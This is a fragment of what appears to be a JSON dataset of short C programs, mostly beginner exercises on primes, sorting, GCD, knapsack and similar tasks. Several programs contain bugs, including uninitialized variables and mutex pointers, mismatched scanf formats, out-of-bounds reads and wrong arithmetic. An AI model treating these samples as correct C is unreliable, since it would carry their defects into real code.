&buf1);\n    delete(buf1);\n    break;\n   case 4:\n    display();\n    break;\n   default:\n    opt = 5;\n    break;\n  }\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint kp(int n) {\n int p=0,f=2;\n if((n%f)==0) {\n  p++;\n  while((n%f)==0)\n   n/=f;\n }\n for(f=3;f<sqrt(n);f+=2)\n  if((n%f)==0) {\n   p++;\n   while((n%f)==0)\n    n/=f;\n  }\n return (n==1)?p:(p+1);\n}\nint main() {\n int t,a,b,k,n,i,f[100001];\n for(i=2;i<100001;++i)\n  f[i]=kp(i);\n scanf(\"%d\",&t);\n while(t--) {\n  scanf(\"%d%d%d\",&a,&b,&k);\n  for(n=0,++b;a<b;++a)\n   if(f[a]==k)\n    n++;\n  printf(\"%d\\n\",n);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    char array[5];\n    int i;\n    for (i = 0; i < 5; i++)\n    {\n        printf(\"Direccion de array[%d] = %p\\n\", i, &array[i]);\n    }\n    printf(\"Contenido de array = %p\\n\", array);\n    return 0;\n}",
    "#include <stdio.h>\nint n = 5;\nint main()\n{\n    printf(\"Masukkan sebuah bilangan bulat: \\n\");\n    scanf(\"%d\", &n);\n    int _divisibleBy = 0;\n    for (int i = 1; i <= n; i = i + 1)\n    {\n        if (n % i == 0)\n        {\n            _divisibleBy++;\n        }\n    }\n    if (_divisibleBy == 2)\n    {\n        printf(\"%d adalah bilangan prima\\n\", n);\n    }\n    else\n    {\n        printf(\"%d bukan bilangan prima\\n\", n);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <inttypes.h>\n\n\nuint32_t generatePalindrome(uint32_t i, uint32_t flag);\nuint32_t isSquareSum(uint32_t* squares, uint32_t pal);\nuint32_t* generateSquares(uint32_t limit);\nuint32_t numLength(uint32_t i);\nint main(int argc, char** argv);\nuint32_t intrev(uint32_t i);\nint isPalindrome(uint32_t i);\nint main(int argc, char** argv)\n{\n        (void) argc;\n        (void) argv;\n        uint64_t sum = 0;\n        uint64_t count = 0;\n        uint32_t* squares = generateSquares(1000);\n        uint32_t p = 1;\n        for(uint32_t r = 0; r < 2; r++){\n                for(uint32_t i = 10; ; i++){\n                        p = generatePalindrome(i, r);\n                        count++;\n                        if(p > 1000) break;\n                        if(isSquareSum(squares, p)){\n                                printf(\"%\"\"u\"\"\\n\", p);\n                                sum += p;\n                        }\n                }\n        }\n        printf(\"%\"\"llu\"\"\\n\", sum);\n        printf(\"count %\"\"llu\"\"\\n\", count);\n        free(squares);\n        return 0;\n}\nuint32_t intrev(uint32_t i)\n{\n        uint32_t rev = 0;\n        uint32_t rem;\n        while(i){\n                rem = i % 10;\n                rev *= 10;\n                rev += rem;\n                i /= 10;\n        }\n        return rev;\n}\nint isPalindrome(uint32_t i)\n{\n        return (i == intrev(i));\n}\nuint32_t generatePalindrome(uint32_t i, uint32_t flag)\n{\n        uint32_t rev = (i);\n        if(flag) i /= 10;\n        while(rev){\n                i = i * 10 + (rev % 10);\n                rev /= 10;\n        }\n        return i;\n}\nuint32_t numLength(uint32_t i)\n{\n        uint32_t rem;\n        uint32_t base = 10;\n        uint32_t n = 1;\n        while(i % base != i){\n                base *= 10;\n                n++;\n        }\n        return n;\n}\nuint32_t isSquareSum(uint32_t* squares, uint32_t pal)\n{\n        for(uint32_t i = 0; squares[i]; i++){\n                if(squares[i] > pal) return 0;\n                uint64_t sum = 0;\n                for(int j = i; squares[j]; j++){\n                        sum += squares[j];\n                        if(sum > pal) break;\n                        if(pal == sum){\n                                return 1;\n                        }\n                }\n        }\n        return 0;\n}\nuint32_t* generateSquares(uint32_t limit)\n{\n        uint32_t* squares = malloc(100000 * sizeof(uint32_t));\n        for(uint32_t i = 1; ; i++){\n                squares[i - 1] = i * i;\n                if(squares[i] > limit) return squares;\n        }\n        return squares;\n}",
    "#include <stdio.h>\nint main(void) {\n        int notas[] = {4, 5, 9, 11, 2, 6, 12, 16, 7, 14};\n        int positivas[10];\n        int negativas[10];\n        int max, min;\n  int total = 10;\n  int aux;\n for(int contador = 1 ; contador < total ; contador++) {\n  for(int i = 0 ; i < total-1 ; i++) {\n   if (notas[i] > notas[i+1]) {\n   aux = notas[i];\n   notas[i] = notas[i+1];\n   notas[i+1] = aux;\n            }\n        }\n    }\n    max = positivas[0];\n    min = negativas[0];\n    for (int i = 0 ; i < total ; i++) {\n        if( notas[i] >= 10) {\n            positivas[i] = notas[i];\n             if(positivas[i] < max)\n            {\n                max = positivas[i];\n            }\n        } else {\n            negativas[i] = notas[i];\n            min = negativas[i];\n        }\n    }\n    printf(\"nota mais baixa positiva: %d \\n\", max);\n    printf(\"nota mais alta negativa: %d \\n\", min);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int n;\n printf(\"%d\\n\",n='l'-'a'+1);\n printf(\"%d\\n\",n*26+n);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int v1; int v2; int vsum;\n int all_in_one=5;\n v1=1;\n v2=2;\n vsum = v1 + v2;\n printf(\"The sum of %i and %i is %i\\n\",v1,v2,vsum);\n printf(\"all_in_one => %i\\n\",all_in_one);\n}",
    "#include <stdio.h>\nint main(){\n int robotLocation[][3] = { {34, 54,0},{75, 9,0},{1,2,0} };\n printf(\"The robot is at x = %d, y = %d, z = %d\\n\", robotLocation[1][0], robotLocation[1][1], robotLocation[1][2]);\n}",
    "#include <stdio.h>\nint main(){\n int x;\n for(x=43; x<12423; x++)\n    printf(\"x = %d \\n\", x);\n return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint palindromo(char cadena[100], int inicio, int final){\n    if(final-inicio==1 || final==inicio){\n        return 1;\n    }\n    else{\n        if(cadena[inicio]==cadena[final]){\n            return palindromo(cadena,inicio+1,final-1);\n        }\n        else{\n            return 0;\n        }\n    }\n}\nint main() {\n    int n, caso = 1, pos, ana=0, monica=0;\n    char cadena [100];\n    scanf(\"%d\", &n);\n    for (int i = 0; i < n; i++){\n        scanf(\"%s\", cadena);\n        if (!caso){\n            monica += palindromo(cadena, 0, strlen(cadena) - 1);\n        } else{\n            ana += palindromo(cadena, 0, strlen(cadena) - 1);\n        }\n        caso = !caso;\n    }\n    if (ana > monica){\n        printf(\"%d %d ANA\", ana, monica);\n    } else if (monica > ana){\n        printf(\"%d %d MONICA\", ana, monica);\n    } else {\n        printf(\"%d %d EMPATE\", ana, monica);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint main( )\n{\ndouble r,h,l,s,s1,v,v2;\nscanf( \"%f%f\",&r,&h) ;\nl=2*3.14*r ;\ns=r*r*3.14 ;\ns1=4*3.14*r*r;\nv=3.14*r*r*r*4/3;\nv2=3.14*r*r*h;\nprintf(\"\u5712\u5468\u9577\u5185=%.2f\\n\",l);\nprintf(\"\u5712\u9762\u91c8\u5185=%.2f\\n\",s);\nprintf ( \"\u5713\u7403\u9762\u67b3\u5185=%.2f\\n\",s1 );\nprintf( \"\u5713\u7403\u4f53\u91c8\u52fa=%.2fn\",v);\nprintf( \"\u5713\u67f1\u4f53\u67b3\u5185=%.2f\\n\",v2);\nreturn 0;\n}",
    "#include <stdio.h>\nint abs(int x) {\n    return x < 0 ? -x : x;\n}\nint main() {\n    int x1, x2, y1, y2;\n    scanf(\"%d %d %d %d\", &x1, &y1, &x2, &y2);\n    while(x1 != 0 || x2 != 0 || y1 != 0 || y2 != 0) {\n        if(x1 == x2 && y1 == y2) {\n            printf(\"0\\n\");\n        } else if(x1 == x2) {\n            printf(\"1\\n\");\n        } else if(y1 == y2) {\n            printf(\"1\\n\");\n        } else if(abs(x1 - x2) == abs(y1 - y2)) {\n            printf(\"1\\n\");\n        } else {\n            printf(\"2\\n\");\n        }\n        scanf(\"%d %d %d %d\", &x1, &y1, &x2, &y2);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i;\n    int j,n,temp;\n    int test_case;\n    int count=0;\n    while(1)\n    {\n        scanf(\"%d\",&test_case);\n        for(i=1; i<=test_case; i++)\n        {\n            scanf(\"%d\",&n);\n            if(i>0 && i!=1 && i!=test_case && i<i-1 && i<i+1){\n                count++;\n            }\n        }\n        printf(\"Case %d: %d\\n\",i,count);\n        count=0;\n        if(test_case==0){\n            break;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int grade;\n  printf(\"Input Grade: \");\n  scanf(\"%d\", &grade);\n  if (grade >= 80)\n    printf(\"Distinction\\n\");\n  else if (79 >= grade && grade >= 60)\n    printf(\"First Class\\n\");\n  else if (59 >= grade && grade >= 40)\n    printf(\"Second Class\\n\");\n  else if (40 > grade)\n    printf(\"Fail\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble bogenmass(double degrees) {\n  return (fmod(degrees, 360) * 3.14159265358979323846) / 180;\n}\nint main() {\n  double degrees;\n  printf(\"Degress (\u00b0): \");\n  scanf(\"%lf\", &degrees);\n  if (degrees <= 0) {\n    printf(\"Only positive numbers allowed.\\n\");\n    return 0;\n  }\n  printf(\"Radians: %lf\\n\", bogenmass(degrees));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\ndouble sum(double x, double y);\ndouble razn(double x, double y);\ndouble prozv(double x, double y);\ndouble delen(double x, double y);\nvoid calc(double(*f)(double x, double y));\nint main()\n{\n    printf(\"Hello world!\\n\");\n    calc(sum);\n    return 0;\n}\ndouble sum(double x, double y)\n{return x+y;}\ndouble razn(double x, double y)\n{return x-y;}\ndouble proizv(double x, double y)\n{return x*y;}\ndouble delen(double x, double y)\n{\n    if(!y)return x*y;\n    else return 0;}\nvoid calc(double(*f)(double x, double y))\n{\n    printf(\"rezult = %g\\n\", (*f)(1.0,2.0));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nunsigned long ackermann(unsigned long m, unsigned long n)\n{\n    if (m == 0) {\n        return n + 1;\n    } else if (m > 0 && n == 0) {\n        return ackermann(m - 1, 1);\n    } else {\n        return ackermann(m - 1, ackermann(m, n - 1));\n    }\n}\nint main()\n{\n    printf(\"%lu\", ackermann(4, 2));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a, b;\n    printf(\"Enter number a: \");\n    scanf(\"%d\", &a);\n    printf(\"Enter number b: \");\n    scanf(\"%d\", &b);\n    b = a + b;\n    a = b - a;\n    b = b - a;\n    printf(\"\\nNumber a is %d\", a);\n    printf(\"\\nNumber b is %d\", b);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    int minutes;\n    double years;\n    double days;\n    double mins_in_year;\n    printf(\"Enter number of minutes: \");\n    scanf(\"%d\", &minutes);\n    mins_in_year = (60 * 24 * 365);\n    years = (minutes / mins_in_year);\n    days = (minutes / 60.0) / 24.0;\n    printf(\"%d minutes is %f years %f days\\n\", minutes, years, days);\n    return (0);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    double factorial(double x);\n    double sum, i, j;\n    sum = 0;\n    for (i = 1; i <= 20; i++)\n    {\n        j = factorial(i);\n        sum = sum + j;\n    }\n    printf(\"%lf\\n\", sum);\n    return 0;\n}\ndouble factorial(double x)\n{\n    double a, s;\n    for (a = 1, s = 1; a <= x; a++)\n    {\n        s = s * a;\n    }\n    return s;\n}",
    "#include <stdio.h>\nvoid convert_to_binary(int num)\n{\n    if(num < 0) return;\n    int j = sizeof(int) * 8;\n    for (int i = 0 ; i < j ; ++i) {\n        printf(\"%d\",(num >> (j - i - 1)) & 0x1);\n    }\n    printf(\"\\n\");\n}\nint main()\n{\n    int a;\n    while (1) {\n        printf(\"please input your integer (any negative integer to quit):\");\n        scanf(\"%d\",&a);\n        if(a < 0) break;\n        convert_to_binary(a);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nchar gimmeAnA(void);\nint main()\n{\n printf(\"On this test you received an %c.\\n\",gimmeAnA());\n return(0);\n}\nchar gimmeAnA(void)\n{\n return('A');\n}",
    "#include <stdio.h>\nint z = 5;\nvoid f(int x, int *y)\n{\n *y = 3;\n int z;\n z =+ *y;\n printf(\"(x,*y,z)=(%d,%d,%d)\\n\", x, *y, z);\n x = 2;\n z =+ x;\n printf(\"(x, *y,z)=%d %d %d \\n\", x, *y, z);\n}\nint main()\n{\n f(z, &z);\n}",
    "#include <stdio.h>\n#include <time.h>\nvoid sleep(double secs);\nint main(void)\n{\n    sleep(5);\n    printf(\"\\n---------------------------------------------\\n\");\n    return 0;\n}\nvoid sleep(double secs)\n{\n    clock_t start = clock();\n    clock_t end;\n    while (1) {\n        end = clock();\n        if ((end - start) * 1.0 / ((clock_t)1000000000) > secs)\n            break;\n    }\n}",
    "int removeElement(int *nums, int numsSize, int val)\n{\n int i, j;\n i = -1;\n j = numsSize;\n while (1) {\n  while (++i < j && nums[i] != val)\n   ;\n  if (i >= j)\n   break;\n  while (--j > i && nums[j] == val)\n   ;\n  if (i >= j)\n   break;\n  nums[i] = nums[j];\n  nums[j] = val;\n }\n return(i);\n}\nint main(void)\n{\n int num[] = { 4, 5 };\n int a = removeElement(num, 2, 4);\n return(0);\n}",
    "#include<stdio.h>\nint main() {\n float l, a,p;\n printf(\"Lado: \");\n scanf(\"%f\", &l);\n a = l + l;\n p = 4 * l;\n printf(\"Area: %.2f\\n\", a);\n printf(\"Perimetro: %.2f\", p);\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <complex.h>\n\n\nint compute_mandelbrot(float real, float imag, int max_iter)\n{\n    float creal = real;\n    float cimag = imag;\n    for (size_t i = 0; i < max_iter; i++)\n    {\n        if (real * real + imag * imag > 4)\n        {\n            return i;\n        }\n        real = real * real - imag * imag + creal;\n        imag = (real * imag * 2 + cimag);\n    }\n    return max_iter;\n}\nint main()\n{\n    int numberOfPixels = 1920 * 1080;\n    clock_t programTime = clock();\n    for (size_t i = 0; i < numberOfPixels; i++)\n    {\n        compute_mandelbrot(0, 0, 1024);\n    }\n    programTime = clock() - programTime;\n    printf(\"%d pixels computed in %f seconds\\n\", numberOfPixels, (float) programTime / ((clock_t)1000000000));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid merge(int [], int, int, int);\nvoid sort(int[], int, int);\nint main(int argc, char * argv[]) {\n    int i, size;\n    size = atoi(argv[1]);\n    int A[size];\n    for (i=0; i<size; i++) {\n        scanf(\"%d\", &A[i]);\n    }\n    sort(A, 0, size-1);\n    for (i=0; i<size; i++) {\n        printf(\"%d \", A[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}\nvoid merge(int A[], int start, int mid, int end) {\n    int sizeL = mid - start + 1;\n    int sizeM = end - mid;\n    int L[sizeL], M[sizeM];\n    int i, j, k;\n    for (i=0; i<sizeL; i++) {\n        L[i] = A[start+i];\n    }\n    for (j=0; j<sizeM; j++) {\n        M[j] = A[mid+j+1];\n    }\n    i = 0;\n    j = 0;\n    k = start;\n    while ((i < sizeL) && (j < sizeM)) {\n        if (L[i] < M[j]) {\n            A[k] = L[i];\n            i++;\n        }\n        else {\n            A[k] = M[j];\n            j++;\n        }\n        k++;\n    }\n    while (i < sizeL) {\n        A[k] = L[i];\n        i++;\n        k++;\n    }\n    while (j < sizeM) {\n        A[k] = M[j];\n        j++;\n        k++;\n    }\n}\nvoid sort(int A[], int start, int end) {\n    if (start < end) {\n        int mid = (start + end)/2;\n        sort(A, start, mid);\n        sort(A, mid+1, end);\n        merge(A, start, mid, end);\n    }\n}",
    "#include <stdio.h>\nint main(){\n    int x;\n    printf(\"\\nHow old are you? \");\n    scanf(\"%d\", &x);\n    printf(\"You are %d years old\", x);\n    return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\nint main(void)\n{\n    double principal, rate, time, emi;\n    printf(\"Enter principal amount: \");\n    scanf(\"%lf\", &principal);\n    printf(\"Enter rate of interest: \");\n    scanf(\"%lf\", &rate);\n    printf(\"Enter time in years: \");\n    scanf(\"%lf\", &time);\n    rate = rate / (12 * 100);\n    time = time * 12;\n    emi = (principal * rate * pow(1 + rate, time)) / (pow(1 + rate, time) - 1);\n    printf(\"Monthly EMI is= %f\\n\", emi);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid populate_array(int *array, size_t arraysize, int (* getNextValue)(void))\n{\n    for (size_t i = 0; i<arraysize; i++)\n    {\n        array[i] = getNextValue();\n    }\n}\nint getNextValue(void)\n{\n    return rand();\n}\nint main(void)\n{\n    int myarray[10];\n    populate_array(myarray, 10, getNextValue);\n    for (int i=0; i<10; i++)\n    {\n        printf(\"%d \\n\", myarray[i]);\n        printf(\"%p \\t\", myarray[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    double res,price=1;\n    int day,time,duration;\n    do{\n        printf(\"Enter the day [1-7] : \");scanf(\"%d\",&day);\n    }while(day<=0 || day>7);\n    do{\n        printf(\"Enter the stared time [0-23]: \");scanf(\"%d\",&time);\n    }while(time<0 || time >23);\n    do{\n        printf(\"Enter the duration of call by minutes : \");scanf(\"%d\",&duration);\n    }while(duration<0);\n    printf(\"Enter the price of minute : \");scanf(\"%f\",&price);\n    for(int i=1;i<=duration;i++){\n       if (day>=6 || day<=7){\n            if(time>=22 || time>8){res=res+(price*0.30);}\n            else{res=res+(price*0.10);}\n        }else{\n            if(time>=22 || time>8){\n                res=res+(price*0.20);\n            }else{\n                res=res+price;\n            }\n        }\n        if (i%59==0){\n            if(time==23){\n                if(day==7){day=1;}\n                else{day++;}\n                time=0;\n            }else{\n                time++;\n            }\n        }\n    }\n    printf(\"Call cost : %f \\n\",res);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n int *a = (int *)malloc(sizeof(int*));\n *a = 10;\n char* b = (char*) a;\n *b = 100;\n char* c = b;\n int d = *c;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main () {\n  int first,second;\n  printf (\"Enter two integers: \");\n  scanf(\"%d %d\", &first, &second);\n  printf(\"The user entered %d and %d\", first, second);\n  return 0;\n}",
    "#include <stdio.h>\nint isprime(int n);\nint main(int argc, char *argv[])\n{\n  int i = 0;\n  int count = 0;\n  while (count<1000) {\n    if (isprime(i) == 1)\n      {\n printf(\"%d: %d\\n\", count+1, i);\n count++;\n      }\n    i++;\n  }\n  return 0;\n}\nint isprime(int n)\n{\n  if (n<=1) return 0;\n  int i;\n  for (i=2; (i*i)<=n; i++) {\n    if (n % i == 0) return 0;\n  }\n  return 1;\n}",
    "#include <stdio.h>\nint main()\n{\n int num;\n printf(\"Digite numero: \\n\");\n if (scanf(\"%d\", &num)==0){\n  printf(\"ERRO. Digitou lixo\\n\");\n  return(1);\n }\n printf(\"OK\\n\");\n return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    FILE * in = fopen(\"INPUT.TXT\", \"r\");\n    FILE * out = fopen(\"OUTPUT.TXT\", \"w\");\n    int N = 0;\n    fscanf(in, \"%d\", &N);\n    long long array[N];\n    for(int i = 0; i < N; ++i)\n    {\n        fscanf(in, \"%lld\", &array[i]);\n    }\n    fscanf(in, \"%d\", &N);\n    int subarray[2];\n    for(int i = 0; i < N; ++i)\n    {\n        fscanf(in, \"%d %d\", &subarray[0], &subarray[1]);\n        for(int j = subarray[0]; j <= subarray[1]; ++j)\n        {\n            fprintf(out, \"%d \", array[j-1]);\n        }\n        fprintf(out, \"\\n\");\n    }\n    fclose(in);\n    fclose(out);\n    return 0;\n}",
    "#include<stdio.h>\n#include<sys/types.h>\n#include<unistd.h>\nint main()\n{\n fork();\n fork();\n printf(\"linux\");\n return 0;\n}",
    "#include<stdio.h>\nvoid soma(double n1, double n2) {\n printf(\"Soma entre %lf e %lf: %lf\", n1, n2, n1 + n2);\n}\nvoid subtracao(double n1, double n2) {\n printf(\"Subtracao entre %lf e %lf: %lf\", n1, n2, n1 - n2);\n}\nvoid multiplicacao(double n1, double n2) {\n printf(\"Multiplicacao entre %lf e %lf: %.2lf\", n1, n2, n1 * n2);\n}\nvoid divisao(double n1, double n2) {\n printf(\"Divisao entre %lf e %lf: %lf\", n1, n2, n1 / n2);\n}\nint main ( void ) {\n int conta;\n double n1, n2;\n void(*f[4])(double, double) = { soma, subtracao, multiplicacao, divisao };\n printf(\"Digite numeros entre 0 e 3, 4 para terminar: \");\n scanf(\"%d\", &conta);\n while(conta >= 0 && conta < 4) {\n  printf(\"\\nDigite dois numeros: \");\n  scanf(\"%lf%lf\", &n1, &n2);\n  (*f[conta])(n1, n2);\n  printf(\"\\nDigite numeros entre 0 e 3, 4 para terminar: \");\n  scanf(\"%d\", &conta);\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\nint** knapsack2(int bag_size, int no_objects, int* objects);\nint pos_min(int arr[3]);\nint min(int a, int b);\nint main () {\n    int bag_size = 0;\n    int tmp_object = 0;\n    int no_objects = 0;\n    int result = -1;\n    int* objects = ((void*)0);\n    int** results = ((void*)0);\n    int i = 0;\n    scanf(\"%d\", &bag_size);\n    objects = (int*)malloc(10000 * sizeof(int));\n    scanf(\"%d\", &tmp_object);\n    while (tmp_object != -1) {\n        objects[no_objects++] = tmp_object;\n        scanf(\"%d\", &tmp_object);\n    }\n    objects = (int*)realloc(objects, no_objects * sizeof(int));\n    results = knapsack2(bag_size, no_objects, objects);\n    for (i = 0; i <= bag_size; i++) {\n        if (result > results[bag_size][i])\n            result = results[bag_size][i];\n    }\n    printf(\"Nb d'objets = %d\\n\\r\", result);\n    for (i = 0; i <= bag_size; i++)\n        free(results[i]);\n    free(results); free(objects);\n    return 0;\n}\nint** knapsack2(int bag_size, int no_objects, int* objects) {\n    int space = 0;\n    int i = 0, j = 0;\n    int** results = ((void*)0);\n    int possible_values[3];\n    results = (int**)malloc((bag_size + 1) * sizeof(int*));\n    for (i = 0; i <= bag_size; i++) {\n        results[i] = (int*)malloc(no_objects * sizeof(int));\n        for (j = 0; j < no_objects; j++)\n            results[i][j] = (i == 0) ? 0 : -1;\n    }\n    for (i = 1; i <= bag_size; i++) {\n        for (j = 1; j <= no_objects; j++) {\n            space = i - objects[j - 1];\n            if (space < 0) continue;\n            possible_values[0] = results[i][j];\n            possible_values[1] = results[i][j - 1];\n            possible_values[2] = results[space][j - 1];\n            results[i][j] = pos_min(possible_values);\n        }\n    }\n    return results;\n}\nint pos_min(int arr[3]) {\n    int min = -1;\n    int i = 0;\n    for (i = 0; i < 3; i++) {\n        if (arr[i] >= 0 && (min < 0 || arr[i] < min))\n            min = arr[i];\n    }\n    return min;\n}\nint min(int a, int b) {\n    return (a < b) ? a : b;\n}",
    "#include <stdio.h>\nint main()\n{\n    int qtd, n, qtd_total, qtd100 = 0, qtd50 = 0, qtd25 = 0, qtd10 = 0, qtd5 = 0, qtd2 = 0, qtd1 = 0;\n    scanf (\"%i\", &qtd);\n    for (int i=0; i<qtd; i++)\n    {\n        scanf (\"%i\", &n);\n        while (n>=100)\n        {\n            n -= 100;\n            qtd100++;\n        }\n        if ((50<=n)&&(n<=99))\n        {\n            n -= 50;\n            qtd50++;\n        }\n        if ((25<=n)&&(n<=49))\n        {\n            n -= 25;\n            qtd25++;\n        }\n        while ((10<=n)&&(n<=24))\n        {\n            n -= 10;\n            qtd10++;\n        }\n        if ((5<=n)&&(n<=9))\n        {\n            n -= 5;\n            qtd5++;\n        }\n        while ((2<=n)&&(n<=4))\n        {\n            n -= 2;\n            qtd2++;\n        }\n        if (n==1)\n        {\n            n--;\n            qtd1++;\n        }\n        qtd_total = qtd100+qtd50+qtd25+qtd10+qtd5+qtd2+qtd1;\n        printf (\"%i notas\\n%i notas de 100\\n%i notas de 50\\n%i notas de 25\\n%i notas de 10\\n%i notas de 5\\n%i notas de 2\\n%i notas de 1\\n\", qtd_total, qtd100, qtd50, qtd25, qtd10, qtd5, qtd2, qtd1);\n        qtd_total = 0;\n        qtd100 = 0;\n        qtd50 = 0;\n        qtd25 = 0;\n        qtd10 = 0;\n        qtd5 = 0;\n        qtd2 = 0;\n        qtd1 = 0;\n    }\n    return 0;\n}",
    "#include<stdio.h>\nvoid chen (int a[],int n,int b[],int pos)\n{\n int j=0;\n for (int i=pos;i<n;i++){\n  b[j++]=a[i];\n }\n}\nvoid chen1 (int a[],int n,int b[],int k){\n for (int i=0;i<n;i++){\n  b[k+i]=a[i];\n }\n}\nint main(){\n int n;\n scanf(\"%d\",&n);\n int a[n];\n for(int i=0;i<n;i++){\n  scanf(\"%d\",&a[i]);\n }\n int k;\n scanf(\"%d\",&k);\n int pos=n-k;\n int b[n];\n chen (a,n,b,pos);\n chen1(a,n,b,k);\n for (int i=0;i<n;i++){\n  printf(\"%d \",b[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\ndouble add(double n1, double n2) {\n double sum = n1 + n2;\n return sum;\n}\nint main() {\n double a, b, c;\n a = 2.8;\n b = 2.7;\n c = add (a, b);\n printf(\"%lf\\n\", c);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n  long nc;\n  nc = 0;\n  printf(\"Input character:\\n\");\n  while(getchar() != (-1)) {\n    ++nc;\n    printf(\"When done press ctrl+D on linux or ctrl+Z on win to end.\\n\");\n  }\n  printf(\"%ld\\n\", nc);\n}",
    "#include <stdio.h>\nint main()\n{\n    int n,i;\n    printf(\"digite numero n: \");\n    scanf(\" %d\", &n);\n    printf(\"\\nDivisores: \");\n    for( i = 0 ; i < n ; i++)\n    {\n        if(i%n == 0)\n        {\n            printf(\"%d \", i);\n        }\n    }\n}",
    "#include <stdio.h>\nint main() {\n    int row, column, i, j, matrix[30][30], temp;\n    printf(\"Please input the size of the 2d-arrays: \");\n    scanf(\"%d %d\", &row, &column);\n    printf(\"\\nFirst 2d-array:\\n\");\n    for (i = 0; i < row; i++) {\n        printf(\"%d row: \", i + 1);\n        for (j = 0; j < column; j++) {\n            scanf(\"%d\", &matrix[i][j]);\n        }\n    }\n    printf(\"\\nSecond 2d-array:\\n\");\n    for (i = 0; i < row; i++) {\n        printf(\"%d row: \", i + 1);\n        for (j = 0; j < column; j++) {\n            scanf(\"%d\", &temp);\n            matrix[i][j] += temp;\n        }\n    }\n    printf(\"\\nAnswer:\\n\");\n    for (i = 0; i < row; i++) {\n        for (j = 0; j < column; j++) {\n            printf(\"%d\\t\", matrix[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nvoid imc_calc(float IMC){\n  if (IMC < 18.5){\n    printf(\"Abaixo do peso: %.2f\",IMC);\n  }else if(IMC >= 18.5 && IMC <25){\n    printf(\"Peso Normal: %.2f\",IMC);\n  }else if (IMC>= 25 && IMC <30){\n    printf(\"Acima do peso: %.2f\\n\", IMC );\n  }else if (IMC >=30){\n    printf (\"Obeso %.2f\\n\", IMC);\n  }\n}\nint main() {\n    float P, H, IMC;\n    printf(\"Digite o seu peso:\\n\");\n    scanf(\"%f\", &P);\n    printf(\"Digite a sua altura:\\n\");\n    scanf(\"%f\", &H);\n    IMC = P / (H*H);\n    imc_calc(IMC);\n}",
    "#include <stdio.h>\n\nint main(int argc, const char * argv[]) {\n    char name[81];\n    char *ptr;\n    printf(\"Hi, what's your name?\\n\");\n    ptr = fgets(name, 81, (stdin));\n    printf(\"%s? Ah! %s!\\n\", name, ptr);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char** argv){\n  if (argc != 2) {\n    printf(\"Nombre de param\u00e8tres insuffisants\\n\");\n    return 1;\n  }\n  int value1 = atoi(argv[1]);\n  int i,j;\n  for (i=0;i<value1;i++){\n     for (j=0;j<=value1-(i+1);j++)printf (\" \");\n        for (j=0;j<2*i+1;j++)printf (\"*\");\n           for (j=0;j<=value1-(i+1);j++)printf (\" \");\n     printf (\"\\n\");\n  }\n  return 0;\n}",
    "#include<pthread.h>\n#include<stdio.h>\nint myglobal;\nvoid *t_fun(void *arg) {\n  pthread_mutex_t *m;\n  pthread_mutex_lock(m);\n  myglobal++;\n  pthread_mutex_unlock(m);\n  return ((void*)0);\n}\nint main () {\n  pthread_t id;\n  pthread_mutex_t *m;\n  pthread_create(&id, ((void*)0), t_fun, ((void*)0));\n  pthread_mutex_lock(m);\n  myglobal++;\n  pthread_mutex_unlock(m);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{ int A,B,X;\nscanf(\"%d %d\", &A,&B);\nX=A+B;\nprintf(\"X = %d\\n\",X);\nreturn 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(void)\n{\n    int c = getchar();\n    while (c != (-1)) {\n        if (c <= 0x20) {\n            putchar(0x20);\n            putchar(c|0x80);\n        } else {\n            putchar(c&0xff);\n        }\n        c = getchar();\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint gcd(int a, int b) {\n  int aux;\n  if(b > a) {\n      aux = a;\n      a = b;\n      b = aux;\n  }\n  while(b != 0) {\n      aux = a%b;\n      a = b;\n      b = aux;\n  }\n  return a;\n}\nint main() {\n  int a, b, i, x = 1;\n  scanf(\"%d %d\", &a, &b);\n  for(i = b; i >= a; i--) {\n    if(x%i != 0)\n      x *= i/gcd(x, i);\n  }\n  printf(\"%d\", x);\n  return 0;\n}",
    "#include<stdio.h>\nint gcd(int a,int b)\n{\n    if(b==0) return a;\n    else return gcd(b,a%b);\n}\nint lcm(int a,int b) {return ((a*b)/gcd(a,b));}\nint main()\n{\n    int cs=0,g,l,a,b;\n    while(1)\n    {\n        scanf(\"%d %d\",&a,&b);\n        if(a==0 && b==0) return 0;\n        g=gcd(a,b);l=lcm(a,b);\n        printf(\"Case %d:\\nGCD: %d\\nLCM: %d\\n\",++cs,g,l);\n    }\n    return 0;\n}",
